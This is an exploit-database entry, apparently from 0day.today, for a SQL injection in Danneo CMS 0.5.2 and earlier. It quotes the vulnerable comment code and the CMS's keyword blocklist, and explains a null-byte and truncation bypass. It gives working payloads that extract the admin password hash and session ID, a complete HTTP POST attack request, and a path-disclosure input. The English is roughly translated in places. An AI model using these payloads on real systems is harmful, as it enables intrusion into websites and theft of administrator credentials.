@@ -1,0 +1,147 @@
+id: 11004
+date: 02/21/2010
+title: Danneo CMS <= 0.5.2 SQL Injection Vulnerability
+author: 0day Today Team
+cves: 
+
+===============================================
+Danneo CMS <= 0.5.2 SQL Injection Vulnerability
+===============================================
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      0
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1
+
+#[+] Discovered By   : Inj3ct0r
+#[+] Site            : Inj3ct0r.com
+#[+] support e-mail  : submit[at]inj3ct0r.com
+
+Product: Danneo CMS 0.5.2
+Site: danneo.com
+
+
+The new vulnerability is discovered in the module vote when adding comments.
+
+Vulnerable code (/mod/poll/comment.php@124-130):
+
+PHP code:
+
+ $comtext=($setting['peditor']=="yes") ? commentparse($comtext) : deltags(commentparse($comtext)); 
+$comname = (preparse($usermain['logged'],THIS_INT)==1 && preparse($usermain['userid'],THIS_INT)>0) ? $usermain['uname'] : substr(deltags($comname),0,50); 
+$comtitle = substr(deltags($comtitle),0,255); 
+
+$in = $db->query("INSERT INTO ".$basepref."_polling_comment VALUES 
+                 (NULL,'".$id."','".$usermain['userid']."','".NEWTIME."', 
+                 '$comname','$comtitle','$comtext','".REMOTE_ADDRS."')"); 
+
+
+	
+The vulnerability occurs after the cutoff line in the variable $ comtitle up to 255 characters, which gives the possibility of a fragmented SQL-injection.
+However, realization of the vulnerability hampered filter (/base/danneo.track.php):
+
+PHP code:
+
+$baddata = array("UNION", 
+                 "OUTFILE", 
+                 "FROM", 
+                 "SELECT", 
+                 "WHERE", 
+                 "SHUTDOWN", 
+                 "UPDATE", 
+                 "DELETE", 
+                 "CHANGE", 
+                 "MODIFY", 
+                 "RENAME", 
+                 "RELOAD", 
+                 "ALTER", 
+                 "GRANT", 
+                 "DROP", 
+                 "INSERT", 
+                 "CONCAT", 
+                 "cmd", 
+                 "exec", 
+                 "--" 
+         /* ... */ 
+                 ); 
+foreach($_REQUEST as $params => $inputdata){ 
+    foreach($baddata as $badkey => $badvalue){ 
+        if(is_string($inputdata) && eregi($badvalue,$inputdata)){ $badcount=1; } 
+    } 
+} 
+
+
+The filter can be successfully circumvented by using null-byte, which will not be escaped with magic_quotes_gpc = on.
+(/base/danneo.function.php):
+
+PHP code:
+
+if(!ini_get("register_globals") || (@get_cfg_var('register_globals')==1)){ 
+//@import_request_variables('GPC'); 
+@extract($_COOKIE,EXTR_SKIP); 
+@extract($_POST,EXTR_SKIP); 
+@extract($_GET,EXTR_SKIP); 
+@extract($_REQUEST,EXTR_SKIP); 
+/* ... */ 
+if(get_magic_quotes_gpc()) { 
+if($_POST) $_POST = stripslashesall($_POST); 
+if($_GET) $_GET = stripslashesall($_GET); 
+if($_REQUEST) $_REQUEST = stripslashesall($_REQUEST); 
+if($_COOKIE) $_COOKIE = stripslashesall($_COOKIE); 
+} 
+
+
+	
+From the code above, it follows that if it enters the filter null-byte will be left without screening after treatment _REQUEST array function stripslashesall (), but
+variables $ comname, $ comtitle, $ comtext be escaped with magic_quotes_gpc = on, because they are not extracted from the global arrays with otchischennymi incoming data, and from the local area.
+This is because extract () is preceded stripslashesall ().
+
+Despite the shielding, the vulnerability can be implemented with the following values:
+$ comname az value of 5 characters to 10
+$ comtitle 254 + character quote
+$comtext /*%00*/, (SELECT adpwd FROM dn052_admin LIMIT 1), 1)-- -
+
+
+As a result, the final query will be:
+
+
+INSERT INTO dn052_polling_comment VALUES
+(NULL,'1','0','1230987393',
+'lololo','a[252 ???????]b\','/*\0*/, (SELECT adpwd FROM dn052_admin LIMIT 1), 1)-- -','127.0.0.1')
+
+	
+After substr () appears \ that screens the following quote and makes it possible to perform SQL-package $ comtext.
+To prevent errors of syntax null-bytes (note here that he has already undergone screening) is among the symbols of comments / * * /.
+As a result, when displaying comments to vote in the text field value appears md5 hash of the admin. You can also get the session ID administrator, if it is authenticated and the lifetime of the session has not expired:
+$ comtext / *% 00 * /, (SELECT hash FROM dn052_admin_sess LIMIT 1), 1) - --
+Prefix table, you can see if the settings in CMS enabled debug-mode for MySQL. To do this you need to call a deliberate syntax error.
+When magic_quotes_gpc = off in $ comtitle quote should be replaced by \, and 254 characters can be removed altogether.
+
+As a result, the request will be so (you need to specify captcha):
+
+code:
+
+POST /index.php?dn=poll HTTP/1.0
+User-Agent: Opera/9.63 (Windows NT 6.0; U; ru) Presto/2.1.1
+Host: danneo
+Referer: http://danneo/index.php?dn=poll&to=open&id=1
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+comname=lololo&comtitle=a++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++++++++++++++++++++++++++++++++++++++++  ++++++++++++b%27&comtext=%2F%2A%2500%2A%2F%2C+%28SELECT+adpwd+FROM+  dn052_admin+LIMIT+1%29%2C+1%29--+-&captcha=56334&id=1&ajax=0&re=comment
+
+
+Also is present disclosure ways:
+/ index.php? re =% 00
+
+
+
+#  0day.today [2023-03-22]  #
